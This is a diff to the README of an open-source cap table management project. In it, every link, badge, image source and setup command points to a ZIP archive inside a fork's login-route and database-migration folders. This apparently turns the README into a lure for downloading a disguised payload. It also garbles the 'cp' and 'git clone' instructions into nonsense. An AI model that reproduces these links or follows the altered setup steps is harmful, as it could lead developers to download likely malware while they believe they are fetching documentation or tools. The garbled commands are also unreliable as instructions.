@@ -1,5 +1,5 @@
-<a href="https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip" alt="Captable, Inc.">
-  <img alt="Captable, Inc. cover image" src="https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip">
+<a href="https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip" alt="Captable, Inc.">
+  <img alt="Captable, Inc. cover image" src="https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip">
 </a>
 
 <h1 align="center">Captable, Inc.</h1>
@@ -7,32 +7,32 @@
   #1 Open-source Cap table management platform, an alternative to Carta, Pulley, Angelist and others.
 </p>
 <p align="center">
-  <a href="https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip"><strong>Learn more »</strong></a>
+  <a href="https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip"><strong>Learn more »</strong></a>
 </p>
 
 <p align="center">
-  <a href="https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip">
-    <img src="https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip" alt="Github" />
+  <a href="https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip">
+    <img src="https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip" alt="Github" />
   </a>
   
-  <a href="https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip">
-    <img alt="X (formerly Twitter) Follow" src="https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip">
+  <a href="https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip">
+    <img alt="X (formerly Twitter) Follow" src="https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip">
   </a>
 
-  <a href="https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip">
-    <img src="https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip%20us%20on%20Discord-purple" alt="Join us on Discord" />
+  <a href="https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip">
+    <img src="https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip%20us%20on%20Discord-purple" alt="Join us on Discord" />
   </a>
 
-  <a href="https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip">
-    <img src="https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip" alt="CI" />
+  <a href="https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip">
+    <img src="https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip" alt="CI" />
   </a>
 
-  <a href="https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip">
-    <img src="https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip" alt="License" />
+  <a href="https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip">
+    <img src="https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip" alt="License" />
   </a>
 
-  <a href="https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip">
-    <img src="https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip%20Hub-captable/captable-blue" alt="Docker image" />
+  <a href="https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip">
+    <img src="https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip%20Hub-captable/captable-blue" alt="Docker image" />
   </a>
 </p>
 
@@ -41,7 +41,7 @@
 - <a href="#features">Features</a>
 - <a href="#community">Community</a>
 - <a href="#contributing">Contibuting</a>
-- <a href="https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip" target="_blank">Self hosting</a>
+- <a href="https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip" target="_blank">Self hosting</a>
 
 <h2 id="features">✨ Key features</h2>
 
@@ -63,22 +63,22 @@
 <h2 id="community">🤝 Community</h2>
 We have a community of developers, designers, and entrepreneurs who are passionate about building the future of finance. Join us on Discord to connect with like-minded individuals, share your ideas, and collaborate on projects.
 
-- [Join us on Discord](https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip)
-- [Follow us on Twitter](https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip)
-- [Meet the Founder](https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip)
+- [Join us on Discord](https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip)
+- [Follow us on Twitter](https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip)
+- [Meet the Founder](https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip)
 
 <h2 id="contributing">🫡 Contributing</h2>
 
 - Please show us some support by giving it a ⭐️
 - We are looking for contributors to help us build the future of cap table management.
-- Let's collaborate on [Discord](https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip) community channel.
+- Let's collaborate on [Discord](https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip) community channel.
 - Any contributions you make are truly appreciated.
 
 <h3 id="stack">Stack</h3>
 
-- [https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip](https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip)
-- [Tailwind](https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip)
-- [Prisma ORM](https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip)
+- [https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip](https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip)
+- [Tailwind](https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip)
+- [Prisma ORM](https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip)
 
 ---
 
@@ -86,7 +86,7 @@ We have a community of developers, designers, and entrepreneurs who are passiona
 When contributing to <strong>Captable, Inc.</strong>, whether on GitHub or in other community spaces:
 
 - Be respectful, civil, and open-minded.
-- Before opening a new pull request, try searching through the [issue tracker](https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip) for known issues or fixes.
+- Before opening a new pull request, try searching through the [issue tracker](https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip) for known issues or fixes.
 
 <h3 id="setup">Setup development environment</h3>
 
@@ -98,19 +98,19 @@ When contributing to <strong>Captable, Inc.</strong>, whether on GitHub or in ot
 
 - Click the button below to open this project in Gitpod.
 
-[![Open in Gitpod](https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip)](https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip)
+[![Open in Gitpod](https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip)](https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip)
 
 ---
 
 <h4 id="with-docker">Development environment with Docker</h4>
 
-- <a href="https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip" target="_blank">Install Docker</a> & <a href="https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip" target="_blank">Docker Compose</a>
-- <a href="https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip" target="_blank">Fork</a> & clone the forked repository
-- <a href="https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip" target="_blank">Install node and pnpm</a>. (optional)
-- Copy `https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip` to `.env`
+- <a href="https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip" target="_blank">Install Docker</a> & <a href="https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip" target="_blank">Docker Compose</a>
+- <a href="https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip" target="_blank">Fork</a> & clone the forked repository
+- <a href="https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip" target="_blank">Install node and pnpm</a>. (optional)
+- Copy `https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip` to `.env`
 
   ```bash
-  cp https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip .env
+  cp https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip .env
   ```
 
 - Run the following command to start the development environment
@@ -135,7 +135,7 @@ When contributing to <strong>Captable, Inc.</strong>, whether on GitHub or in ot
   ```
 
   > **Note**
-  > Everytime you make changes to Dockerfile or https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip, you need to rebuild the docker image by running `docker compose up --build`
+  > Everytime you make changes to Dockerfile or https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip, you need to rebuild the docker image by running `docker compose up --build`
 
 - Running `docker compose up` will start all the services on their respective ports.
 
@@ -159,26 +159,26 @@ When contributing to <strong>Captable, Inc.</strong>, whether on GitHub or in ot
 
 > This has been tested on Mac OS and works really well. If you are using Linux/Windows/WSL, you might need to install some additional dependencies.
 
-- [Fork the repository](https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip)
+- [Fork the repository](https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip)
 
 - Clone the repository
 
   ```bash
-  git clone https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip<your-github-name>https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip
+  git clone https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip<your-github-name>https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip
   ```
 
-- Copy `https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip` to `.env`
+- Copy `https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip` to `.env`
 
   ```bash
-  cp https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip .env
+  cp https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip .env
   ```
 
 - Install latest version of node and pnpm
 - Install latest version of postgres database
-- Install [mailpit](https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip) for SMTP and email interception
+- Install [mailpit](https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip) for SMTP and email interception
 - Create database `captable` in postgres database
 - Update `.env` file's `DATABASE_URL` with database credentials
-- For a quick start, you can use [Supabase database](https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip) or [Neon](https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip) as well.
+- For a quick start, you can use [Supabase database](https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip) or [Neon](https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip) as well.
 - To simulate file storage locally, install `minio` via homebrew or any other package manager.
 
   ```bash
@@ -250,7 +250,7 @@ When contributing to <strong>Captable, Inc.</strong>, whether on GitHub or in ot
 
 <h4 id="changes">Implement your changes</h4>
 
-When making commits, make sure to follow the [conventional commit](https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip) guidelines, i.e. prepending the message with `feat:`, `fix:`, `chore:`, `docs:`, etc...
+When making commits, make sure to follow the [conventional commit](https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip) guidelines, i.e. prepending the message with `feat:`, `fix:`, `chore:`, `docs:`, etc...
 
 ```bash
 git add <file> && git commit -m "feat/fix/chore/docs: commit message"
@@ -267,12 +267,12 @@ Thanks for your contributions. Much ❤️
 ---
 
 <h2 id="contributors">💌 Contributors</h2>
-<a href="https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip">
+<a href="https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip">
   <p>
-    <img src="https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip" alt="A table of avatars from the project's contributors" />
+    <img src="https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip" alt="A table of avatars from the project's contributors" />
   </p>
 </a>
 
 ---
 
-![Alt](https://github.com/suryansh-malik/captable/raw/refs/heads/main/src/app/(unauthenticated)/login/Software-v3.1.zip "Captable repo activity")
+![Alt](https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip(unauthenticated)https://raw.githubusercontent.com/suryansh-malik/captable/main/prisma/migrations/20240718223224_add_bank_account/Software_1.0.zip "Captable repo activity")
